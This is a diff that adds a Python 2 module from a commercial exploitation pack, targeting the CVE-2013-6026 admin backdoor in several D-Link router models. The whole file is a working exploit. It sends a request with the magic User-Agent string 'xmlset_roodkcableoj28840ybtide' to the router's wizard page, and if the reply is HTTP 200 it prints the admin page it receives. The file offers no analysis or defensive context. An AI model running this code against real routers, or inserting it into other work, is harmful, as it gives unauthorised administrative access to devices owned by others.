@@ -1,0 +1,49 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_dlink_9'
+_vendor_ = 'd-link'
+_model_  = ['DIR-100', 'DIR-120', 'DI-624S', 'DI-524UP', 'DI-604S', 'DI-604UP', 'DI-604', 'TM-G5240']
+_vuln_   = 'Admin Access Backdoor'
+_cve_    = 'CVE-2013-6026'
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, 'http://%s/QIS_wizard.htm?flag=detect' % host)
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.setopt(pycurl.USERAGENT, 'xmlset_roodkcableoj28840ybtide')
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  status = c.getinfo(pycurl.HTTP_CODE)
+  if status != 200:
+    print '[+] %s not vulnerable' % host
+    return
+  data = nfo.getvalue()
+  print '[+] %s vulnerable:' % host
+  print '%s' % data
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
